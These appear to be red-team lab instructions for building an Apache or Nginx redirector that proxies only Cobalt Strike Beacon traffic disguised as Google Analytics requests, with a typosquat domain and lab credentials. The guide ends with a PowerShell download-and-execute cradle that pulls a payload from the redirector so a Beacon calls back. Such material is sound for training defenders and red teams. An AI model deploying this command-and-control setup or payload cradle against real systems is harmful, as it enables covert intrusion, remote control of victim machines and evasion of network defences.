# Apache

1. From the Windows taskbar, open Terminal.
    
2. SSH into the redirector VM.
    
    1. ssh attacker@10.0.0.100
    2. Login with Passw0rd!
3. Install Apache.
    
    1. sudo apt update
    2. sudo apt -y install apache2
4. Enable the required modules.
    
    1. sudo a2enmod rewrite proxy proxy_http
5. Open the configuration file.
    
    1. sudo nano /etc/apache2/sites-enabled/000-default.conf
    2. Insert the following code after the closing _VirtualHost_ tag.

```
<Directory /var/www/html/>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Require all granted
</Directory>
````

1. Save the changes.
    
    > Press _Ctrl+O_ then _Enter_ to save the changes; and _Ctrl+X_ to close the file.
    
2. Restart Apache.
    
    1. sudo systemctl restart apache2
3. Create the _.htaccess_ file.
    
    1. sudo nano /var/www/html/.htaccess
    2. Paste the following:
    
```
RewriteEngine on

RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{REQUEST_URI} ^/a$
RewriteRule ^.*$ http://10.0.0.5%{REQUEST_URI} [P,L]

RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{REQUEST_URI} ^/__utm.gif$
RewriteCond %{QUERY_STRING} ^utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US&utmcc=__utma(.*)$
RewriteRule ^.*$ http://10.0.0.5%{REQUEST_URI} [P,L]

RewriteCond %{REQUEST_METHOD} POST [NC]
RewriteCond %{REQUEST_URI} ^/___utm.gif$
RewriteCond %{QUERY_STRING} ^utmac=UA-220[0-9]+-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US$
RewriteRule ^.*$ http://10.0.0.5%{REQUEST_URI} [P,L]

RewriteRule ^.*$ - [R=404,L]
```
    1. Save the changes.



# Nginx

1. From the Windows taskbar, open Terminal.
    
2. SSH into the redirector VM.
    
    1. ssh attacker@10.0.0.100
    2. Login with Passw0rd!
3. Install NGINX.
    
    1. sudo apt update
    2. sudo apt -y install nginx
4. Open the configuration file.
    
    1. sudo nano /etc/nginx/sites-enabled/default
    2. Delete the default _location /_ block.
    3. Paste the following blocks:
```
location /a {
    if ($request_method !~* GET) {
        return 404;
    }

    proxy_pass http://10.0.0.5;
    include proxy_params;
}

location /__utm.gif {
    if ($request_method !~* GET) {
        return 404;
    }

    if ($query_string !~ ^utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US&utmcc=__utma.+$) {
        return 404;
    }

    proxy_pass http://10.0.0.5;
    include proxy_params;
}

location /___utm.gif {
    if ($request_method !~* POST) {
        return 404;
    }

    if ($query_string !~ ^utmac=UA-220[0-9]+-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US) {
        return 404;
    }

    proxy_pass http://10.0.0.5;
    include proxy_params;
}

location / {
    return 404;
}

```

1. Save the changes.
    
    > Press _Ctrl+O_ then _Enter_ to save the changes; and _Ctrl+X_ to close the file.
    
2. Restart NGINX.
    
    1. sudo systemctl restart nginx

# Test config

1. From the Windows taskbar, run Cobalt Strike and connect to the Team Server.
    
2. Go to **Cobalt Strike > Listeners**.
    
3. Click **Add** to create a listener.
    
    1. Name: http
    2. Payload: Beacon HTTP
    3. HTTP Hosts: www.tehregister.com
    4. HTTP Host (Stager): www.tehregister.com
    5. Click **Save**.
    
    > _www.tehregister.com_ resolves to 10.0.0.100, which is the IP address of the NGINX VM.


**Test a payload**

1. To go **Attacks > Scripted Web Delivery**.
    
2. Select the HTTP listener and click **Launch**.
    
3. Switch over to [Workstation 1](https://labclient.labondemand.com/Instructions/16507ab7-2d8b-46fa-bbd3-3a75afe95e18#) and login with Passw0rd!.
    
4. Open a PowerShell window.
    
5. Download and execute the payload.
    
    powershellTypeCopy
    
    `iex (new-object net.webclient).downloadstring("http://www.tehregister.com/a")`
    
6. Switch back to the [Attacker Desktop](https://labclient.labondemand.com/Instructions/16507ab7-2d8b-46fa-bbd3-3a75afe95e18#) and you should see a Beacon checking in.